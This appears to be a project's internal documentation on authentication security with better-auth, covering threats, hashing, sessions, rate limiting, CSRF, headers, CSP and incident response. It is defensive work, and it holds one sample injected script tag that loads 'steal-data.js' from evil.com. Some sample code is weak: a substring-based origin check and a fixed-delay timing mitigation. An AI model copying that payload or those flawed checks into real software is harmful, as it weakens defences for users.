# Authentication Security

## Security Model

Sunrise implements **defense in depth** for authentication security using **better-auth**, with multiple layers of protection from network to application code. This document covers threat models, security measures, and best practices specific to better-auth.

## Threat Model

### Identified Threats

1. **Credential Stuffing**: Automated login attempts using leaked credentials from other services
2. **Brute Force**: Systematic password guessing attacks
3. **Session Hijacking**: Stealing session tokens to impersonate users
4. **CSRF (Cross-Site Request Forgery)**: Forcing authenticated users to execute unwanted actions
5. **XSS (Cross-Site Scripting)**: Injecting malicious scripts to steal session data
6. **SQL Injection**: Manipulating database queries through input
7. **Timing Attacks**: Inferring information from response timing differences
8. **Password Database Breach**: Exposure of stored password hashes
9. **OAuth Token Theft**: Intercepting OAuth authorization codes or tokens
10. **Session Fixation**: Forcing a user to use a known session ID

## Security Measures

### 1. Secure Password Storage

**Implementation**: scrypt (better-auth default)

better-auth uses **scrypt** by default, which is more secure than bcrypt for password hashing. Scrypt is designed to be memory-hard, making it extremely resistant to hardware brute-force attacks.

```typescript
// lib/auth/config.ts
import { betterAuth } from 'better-auth';

export const auth = betterAuth({
  emailAndPassword: {
    enabled: true,
    // Uses scrypt by default - no configuration needed
    // Default parameters: N=32768, r=8, p=1, keylen=64
  },
});
```

**scrypt vs bcrypt**:

- **scrypt**: Memory-hard (requires significant RAM), more resistant to ASIC/GPU attacks
- **bcrypt**: CPU-hard only, vulnerable to specialized hardware
- **Performance**: Both intentionally slow (~150-300ms per hash)

**Protection Against**:

- **Rainbow Tables**: Unique salt per password prevents precomputed hash tables
- **Brute Force**: Memory-hard algorithm makes each guess expensive
- **Timing Attacks**: Constant-time comparison built into scrypt/bcrypt
- **Database Breach**: Stolen hashes are computationally infeasible to crack

### 2. Session Security

**Implementation**: Database sessions with cookie cache

```typescript
// lib/auth/config.ts
export const auth = betterAuth({
  session: {
    expiresIn: 60 * 60 * 24 * 30, // 30 days in seconds
    updateAge: 60 * 60 * 24, // Update session every 24 hours
    cookieCache: {
      enabled: true,
      maxAge: 60 * 5, // 5 minutes cookie cache
    },
  },
});
```

**Session Strategy**:

- **Primary**: Database-backed sessions (can be revoked server-side)
- **Cache**: Short-lived cookie cache (5 minutes) for performance
- **Cookies**: HTTP-only, Secure, SameSite=Lax by default

**Cookie Configuration**:
better-auth automatically sets secure cookie defaults:

```typescript
// Automatic configuration (no code needed)
{
  httpOnly: true,      // Prevents JavaScript access
  secure: true,        // HTTPS only in production
  sameSite: 'lax',     // CSRF protection
  path: '/',
}
```

**Cookie Cache Strategies**:
better-auth supports three encoding strategies:

```typescript
export const auth = betterAuth({
  session: {
    cookieCache: {
      enabled: true,
      maxAge: 5 * 60, // 5 minutes
      strategy: 'compact', // or 'jwt' or 'jwe'
    },
  },
});
```

- **compact**: Smallest size, basic encoding
- **jwt**: JSON Web Token format, widely compatible
- **jwe**: JSON Web Encryption, most secure (encrypted payload)

**Protection Against**:

- **XSS**: `httpOnly: true` prevents JavaScript from accessing cookies
- **CSRF**: `sameSite: 'lax'` blocks cross-site cookie sending + built-in CSRF tokens
- **Man-in-the-Middle**: `secure: true` requires HTTPS in production
- **Session Fixation**: better-auth rotates session tokens on login
- **Session Hijacking**: Database sessions can be revoked immediately

**Session Revocation**:

```typescript
// Revoke all sessions on password change
await authClient.changePassword({
  newPassword: newPassword,
  currentPassword: currentPassword,
  revokeOtherSessions: true, // Force re-auth on all devices
});

// Manual session revocation
await authClient.signOut({
  fetchOptions: {
    onSuccess: () => {
      // All sessions for this user are revoked
    },
  },
});
```

**Environment Validation**:

```typescript
// Enforce strong secret in production
if (
  process.env.NODE_ENV === 'production' &&
  (!process.env.BETTER_AUTH_SECRET || process.env.BETTER_AUTH_SECRET.length < 32)
) {
  throw new Error('BETTER_AUTH_SECRET must be at least 32 characters');
}
```

### 3. Rate Limiting

**Implementation**: Application-level rate limiting (recommended for better-auth)

```typescript
// lib/security/rate-limit.ts
import { LRUCache } from 'lru-cache';

type RateLimitOptions = {
  interval: number; // Time window in ms
  uniqueTokenPerInterval: number; // Max unique IPs to track
};

export function rateLimit(options: RateLimitOptions) {
  const tokenCache = new LRUCache({
    max: options.uniqueTokenPerInterval,
    ttl: options.interval,
  });

  return {
    check: (limit: number, token: string): { success: boolean; remaining: number } => {
      const tokenCount = (tokenCache.get(token) as number) || 0;

      if (tokenCount >= limit) {
        return { success: false, remaining: 0 };
      }

      tokenCache.set(token, tokenCount + 1);
      return { success: true, remaining: limit - tokenCount - 1 };
    },
  };
}

// Usage in API routes
const limiter = rateLimit({
  interval: 60 * 1000, // 1 minute
  uniqueTokenPerInterval: 500, // Max 500 unique IPs per minute
});

export async function POST(request: NextRequest) {
  const ip = request.ip ?? request.headers.get('x-forwarded-for') ?? '127.0.0.1';
  const { success } = limiter.check(5, ip); // 5 requests per minute per IP

  if (!success) {
    return Response.json(
      { success: false, error: { message: 'Too many requests' } },
      { status: 429 }
    );
  }

  // Process request
}
```

**Configuration by Endpoint**:

- Login: 5 attempts per minute per IP
- Signup: 3 attempts per minute per IP
- Password reset: 3 attempts per 15 minutes per IP
- API endpoints: 100 requests per minute per authenticated user

**Protection Against**:

- Brute force attacks
- Credential stuffing
- API abuse
- DDoS attempts

### 4. Input Validation & Sanitization

**Zod Validation** (all inputs):

```typescript
// lib/validations/auth.ts
import { z } from 'zod';

export const passwordSchema = z
  .string()
  .min(8, 'Minimum 8 characters')
  .max(100, 'Maximum 100 characters')
  .regex(/[A-Z]/, 'Must contain uppercase letter')
  .regex(/[a-z]/, 'Must contain lowercase letter')
  .regex(/[0-9]/, 'Must contain number')
  .regex(/[^A-Za-z0-9]/, 'Must contain special character');

export const signInSchema = z.object({
  email: z
    .string()
    .min(1, 'Email is required')
    .email('Invalid email address')
    .max(255)
    .toLowerCase()
    .trim(),
  password: z.string().min(1, 'Password is required').max(100), // Prevent excessive input
});

// Always validate in API routes
export async function POST(request: Request) {
  const body = await request.json();

  try {
    const validatedData = signInSchema.parse(body);
    // Continue with validated data
  } catch (error) {
    if (error instanceof z.ZodError) {
      return Response.json(
        { success: false, error: { message: 'Validation failed', details: error.errors } },
        { status: 400 }
      );
    }
  }
}
```

**Protection Against**:

- SQL Injection: Prisma uses parameterized queries, Zod validates types
- XSS: React auto-escapes, Content-Security-Policy headers
- NoSQL Injection: Type validation prevents malicious operators
- Buffer Overflow: Max length limits prevent memory exhaustion

### 5. CSRF Protection

**better-auth Built-in**:
better-auth includes automatic CSRF protection via:

- CSRF tokens in state-changing requests
- SameSite cookie attribute
- Origin header validation

```typescript
// Automatic CSRF protection (no configuration needed)
// app/api/auth/[...all]/route.ts
import { auth } from '@/lib/auth/config';

export const { GET, POST } = auth.handler;
// better-auth automatically:
// 1. Generates CSRF tokens
// 2. Validates tokens on POST/PUT/DELETE requests
// 3. Checks Origin/Referer headers
```

**Additional Protection via Proxy** (Next.js 16):

```typescript
// proxy.ts
import { NextResponse } from 'next/server';
import type { NextRequest } from 'next/server';

export function proxy(request: NextRequest) {
  // Validate Origin for state-changing requests
  if (['POST', 'PUT', 'DELETE', 'PATCH'].includes(request.method)) {
    const origin = request.headers.get('origin');
    const host = request.headers.get('host');

    if (origin && !origin.includes(host || '')) {
      return new NextResponse('Forbidden', { status: 403 });
    }
  }

  return NextResponse.next();
}
```

**Protection Against**: Cross-site request forgery attacks

### 6. Security Headers

**Implementation via proxy** (Next.js 16):

```typescript
// proxy.ts
export function proxy(request: NextRequest) {
  // ... authentication checks ...

  // Add security headers to all responses
  const response = NextResponse.next();

  // Prevent clickjacking
  response.headers.set('X-Frame-Options', 'DENY');

  // Prevent MIME type sniffing
  response.headers.set('X-Content-Type-Options', 'nosniff');

  // Enable XSS filter (legacy browsers)
  response.headers.set('X-XSS-Protection', '1; mode=block');

  // Control referrer information
  response.headers.set('Referrer-Policy', 'strict-origin-when-cross-origin');

  // Permissions policy - disable unnecessary features
  response.headers.set('Permissions-Policy', 'geolocation=(), microphone=(), camera=()');

  // Force HTTPS in production
  if (process.env.NODE_ENV === 'production') {
    response.headers.set('Strict-Transport-Security', 'max-age=31536000; includeSubDomains');
  }

  return response;
}
```

**Note**: Content-Security-Policy is intentionally omitted from the current implementation to avoid conflicts with Next.js development tools. See "Content Security Policy (CSP)" section below for implementation guidance.

### 7. Content Security Policy (CSP)

**Status**: Not yet implemented

**What is CSP?**
Content-Security-Policy is a security header that tells browsers what resources (scripts, styles, images, etc.) are allowed to load and execute. It's the **most effective defense against XSS attacks**.

**Why Next.js Development Mode Conflicts with Strict CSP:**
Next.js development features that violate strict CSP:

- **Hot Module Replacement (HMR)**: Uses `eval()` requiring `'unsafe-eval'`
- **Inline Scripts**: Next.js injects inline scripts for hydration requiring `'unsafe-inline'`
- **Dynamic Style Injection**: Fast Refresh injects inline styles requiring `'unsafe-inline'`

**Solution: Environment-Specific Policies**
Use different CSP policies for development and production:

```typescript
// proxy.ts
export function proxy(request: NextRequest) {
  // ... other code ...

  const response = NextResponse.next();

  // Environment-specific CSP
  const csp =
    process.env.NODE_ENV === 'production'
      ? // Production: Strict policy
        "default-src 'self'; " +
        "script-src 'self'; " +
        "style-src 'self'; " +
        "img-src 'self' data: https:; " +
        "font-src 'self' data:; " +
        "connect-src 'self'; " +
        "frame-ancestors 'none';"
      : // Development: Permissive policy for Next.js
        "default-src 'self'; " +
        "script-src 'self' 'unsafe-eval' 'unsafe-inline'; " +
        "style-src 'self' 'unsafe-inline'; " +
        "img-src 'self' data: https:; " +
        "font-src 'self' data:; " +
        "connect-src 'self' webpack://*;";

  response.headers.set('Content-Security-Policy', csp);

  // ... other headers ...
  return response;
}
```

**CSP Directives Explained:**

- `default-src 'self'` - Only load resources from same origin by default
- `script-src 'self'` - Only execute scripts from same origin (blocks injected scripts)
- `'unsafe-eval'` - Allows `eval()` (dev only, for HMR)
- `'unsafe-inline'` - Allows inline scripts/styles (dev only, for Fast Refresh)
- `img-src 'self' data: https:` - Allow same-origin, data URIs, and any HTTPS images
- `frame-ancestors 'none'` - Prevent iframe embedding (replaces X-Frame-Options)

**Attack Prevention Example:**

```html
<!-- Without CSP: This injected script runs -->
<script src="https://evil.com/steal-data.js"></script>

<!-- With CSP: Browser blocks it because evil.com is not in script-src -->
<!-- Console error: "Refused to load script from 'https://evil.com/...' because it violates CSP" -->
```

**Advanced: Nonce-based CSP** (Most Secure):
Instead of `'unsafe-inline'`, use nonces for inline scripts:

```typescript
// Generate unique nonce per request
const nonce = crypto.randomBytes(16).toString('base64');

const csp = `script-src 'self' 'nonce-${nonce}'; style-src 'self' 'nonce-${nonce}'`;

// Pass nonce to Next.js pages for inline scripts
// <script nonce={nonce}>...</script>
```

**Why CSP is Critical:**

- **XSS Defense**: Primary protection against cross-site scripting
- **Data Injection Prevention**: Blocks unauthorized resource loading
- **Clickjacking Protection**: `frame-ancestors` directive replaces X-Frame-Options
- **Modern Standard**: Recommended by OWASP, required for high-security applications

**CSP Reporting** (Optional):
Monitor CSP violations in production:

```typescript
const csp =
  "default-src 'self'; " +
  "script-src 'self'; " +
  'report-uri /api/csp-report; ' +
  'report-to csp-endpoint';

// Create endpoint to receive reports
// app/api/csp-report/route.ts
export async function POST(request: Request) {
  const report = await request.json();
  // Log or store CSP violations
  console.warn('CSP Violation:', report);
  return new Response(null, { status: 204 });
}
```

### 8. Password Reset Security

**Token Generation**:

```typescript
import { randomBytes } from 'crypto';

// Cryptographically secure random token
const token = randomBytes(32).toString('hex'); // 64 character hex string

// Store in verification table (better-auth handles this)
// Tokens are automatically hashed and expire after configured time
```

**Timing Attack Prevention**:

```typescript
// app/api/auth/reset-request/route.ts
export async function POST(request: Request) {
  const { email } = await request.json();

  const user = await prisma.user.findUnique({ where: { email } });

  // ALWAYS return success (prevent email enumeration)
  if (!user) {
    // Simulate processing time to prevent timing attacks
    await new Promise((resolve) => setTimeout(resolve, 100));
    return Response.json({ success: true });
  }

  // Generate token and send email
  await generateTokenAndSendEmail(user);

  return Response.json({ success: true });
}
```

**Protection Against**:

- Email enumeration (can't determine if email exists)
- Token prediction (cryptographically random)
- Token replay (single use via verification table)
- Brute force (rate limited to 3 attempts per 15 minutes)

### 8. OAuth Security

**State Parameter Validation**:
better-auth automatically generates and validates state parameters to prevent CSRF in OAuth flows.

**OAuth Configuration**:

```typescript
// lib/auth/config.ts
export const auth = betterAuth({
  socialProviders: {
    google: {
      clientId: process.env.GOOGLE_CLIENT_ID || '',
      clientSecret: process.env.GOOGLE_CLIENT_SECRET || '',
      enabled: !!(process.env.GOOGLE_CLIENT_ID && process.env.GOOGLE_CLIENT_SECRET),
    },
  },
});
```

**Callback URL Validation**:
better-auth validates redirect URLs to prevent open redirect vulnerabilities.

**Protection Against**:

- Open redirect vulnerabilities
- OAuth authorization code interception
- State parameter CSRF attacks
- Token theft via XSS (tokens stored in HTTP-only cookies)

## Security Best Practices

### 1. Environment Variable Security

```bash
# .env.local (NEVER commit this file)

# Strong secret (32+ characters, random)
BETTER_AUTH_SECRET="your-super-secret-random-string-32-chars-minimum"

# Generate with:
# openssl rand -base64 32

# Base URL (production URL in production)
BETTER_AUTH_URL="https://yourdomain.com"

# Database URL (avoid exposing in logs)
DATABASE_URL="postgresql://user:password@localhost:5432/db"

# OAuth credentials (never expose client secrets)
GOOGLE_CLIENT_SECRET="secret-value-not-in-repo"
```

### 2. Password Policy

Enforced via Zod schema (see Input Validation section above):

- Minimum 8 characters
- Maximum 100 characters
- At least one uppercase letter
- At least one lowercase letter
- At least one number
- At least one special character

**Rationale**: NIST guidelines recommend length over complexity, but we balance usability with security.

### 3. Account Lockout (Optional Enhancement)

```typescript
// lib/auth/account-lockout.ts
const MAX_FAILED_ATTEMPTS = 5;
const LOCKOUT_DURATION = 15 * 60 * 1000; // 15 minutes

export async function checkAccountLockout(email: string): Promise<boolean> {
  const attempts = await prisma.loginAttempt.count({
    where: {
      email,
      createdAt: { gte: new Date(Date.now() - LOCKOUT_DURATION) },
      success: false,
    },
  });

  return attempts >= MAX_FAILED_ATTEMPTS;
}

export async function recordLoginAttempt(email: string, success: boolean) {
  await prisma.loginAttempt.create({
    data: { email, success, createdAt: new Date() },
  });

  // Clean up old attempts
  await prisma.loginAttempt.deleteMany({
    where: {
      createdAt: { lt: new Date(Date.now() - LOCKOUT_DURATION) },
    },
  });
}
```

### 4. Audit Logging

```typescript
// lib/auth/audit-log.ts
export async function logAuthEvent(
  event: 'login' | 'logout' | 'signup' | 'password_reset' | 'password_change',
  userId: string,
  metadata?: Record<string, unknown>
) {
  await prisma.auditLog.create({
    data: {
      userId,
      event,
      metadata,
      ipAddress: metadata?.ip as string,
      userAgent: metadata?.userAgent as string,
      timestamp: new Date(),
    },
  });
}

// Usage in auth callbacks
await logAuthEvent('login', user.id, {
  ip: request.ip,
  userAgent: request.headers.get('user-agent'),
  provider: 'credentials',
});
```

## Vulnerability Scanning

### Dependency Auditing

```bash
# Run monthly
npm audit

# Auto-fix vulnerabilities
npm audit fix

# Review breaking changes
npm audit fix --force
```

### Security Checklist

- [x] All passwords hashed with scrypt (better-auth default)
- [ ] BETTER_AUTH_SECRET is 32+ characters
- [x] Session cookies are httpOnly, secure, sameSite
- [ ] Rate limiting on auth endpoints
- [x] Input validation on all user inputs
- [x] CSRF protection enabled (better-auth built-in)
- [ ] Security headers set in middleware
- [ ] HTTPS enforced in production
- [x] OAuth redirect URLs validated (better-auth built-in)
- [x] Sensitive errors don't leak information
- [x] Database uses connection pooling with limits
- [ ] Regular dependency updates

## Incident Response

### Suspected Session Compromise

1. Rotate `BETTER_AUTH_SECRET` (invalidates all sessions)
2. Force all users to re-login (sessions stored in database can be cleared)
3. Review audit logs for suspicious activity
4. Check for XSS vulnerabilities in recent changes
5. Enable session revocation on password change

**Database Session Revocation**:

```sql
-- Revoke all sessions for a user
DELETE FROM session WHERE userId = 'user-id';

-- Revoke all sessions globally
DELETE FROM session;
```

### Password Database Breach

1. Assess scope (which passwords exposed)
2. Force password reset for affected users
3. Send breach notification emails
4. Review password hashing implementation
5. Consider adding additional security layer (2FA)

## Decision History & Trade-offs

### scrypt vs bcrypt for Password Hashing

**Decision**: Use scrypt (better-auth default)
**Security Implications**:

- **Pro**: Memory-hard algorithm, resistant to ASIC/GPU attacks
- **Pro**: More secure than bcrypt against specialized hardware
- **Pro**: Configurable memory cost for future-proofing
- **Con**: Slightly higher server memory usage
- **Mitigation**: Monitor memory usage, adjust parameters if needed

**Why scrypt?**: Modern best practice, recommended by security experts over bcrypt for new applications.

### Database Sessions vs Pure JWT

**Decision**: Database sessions with cookie cache (hybrid)
**Security Implications**:

- **Pro**: Can revoke sessions server-side immediately
- **Pro**: Session data not exposed in JWT
- **Pro**: More control over session lifecycle
- **Con**: Requires database query for validation (mitigated by 5-min cache)
- **Con**: Slightly more complex infrastructure

**Why hybrid?**: Best of both worlds - security of database sessions with performance of short-lived cache.

### Session Expiry (30 days)

**Decision**: 30-day session expiry with 24-hour update age
**Rationale**:

- Balance between security and user experience
- Sessions update every 24 hours when active
- Inactive sessions expire after 30 days
- Can be adjusted per deployment needs

### Rate Limiting Strategy

**Decision**: In-memory LRU cache vs Redis
**Rationale**:

- Simpler deployment (no Redis dependency)
- Sufficient for single-server deployment
- Upgrade to Redis when horizontal scaling needed

**Trade-offs**: Limits reset on server restart, not shared across instances

### Cookie Cache Strategy

**Decision**: "compact" encoding (default)
**Alternatives**: "jwt" or "jwe"
**Rationale**:

- Smallest cookie size
- Sufficient security with HTTPS
- Can upgrade to "jwe" (encrypted) if needed

## Advanced Security Features

### Hybrid Stateless Sessions with Secondary Storage

For advanced use cases, better-auth supports Redis-backed sessions:

```typescript
import { betterAuth } from 'better-auth';
import { redis } from './redis';

export const auth = betterAuth({
  secondaryStorage: {
    get: async (key) => await redis.get(key),
    set: async (key, value, ttl) => await redis.set(key, value, 'EX', ttl),
    delete: async (key) => await redis.del(key),
  },
  session: {
    cookieCache: {
      maxAge: 5 * 60, // 5 minutes
      refreshCache: false, // Disable stateless refresh
    },
  },
});
```

### API Key Security (if using API key plugin)

```typescript
import { betterAuth } from 'better-auth';
import { apiKey } from 'better-auth/plugins';

export const auth = betterAuth({
  plugins: [
    apiKey({
      // NEVER disable hashing in production
      disableKeyHashing: false, // Recommended: keep keys hashed
    }),
  ],
});
```

## Related Documentation

- [Auth Overview](./overview.md) - Authentication flows and configuration
- [Auth Integration](./integration.md) - Framework integration patterns
- [API Headers](../api/headers.md) - Security headers and CORS configuration
- [Architecture Overview](../architecture/overview.md) - Overall security architecture

## Resources

- [better-auth Documentation](https://www.better-auth.com/docs)
- [better-auth Security Guide](https://www.better-auth.com/docs/concepts/security)
- [scrypt Password Hashing](https://en.wikipedia.org/wiki/Scrypt)
- [OWASP Authentication Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html)
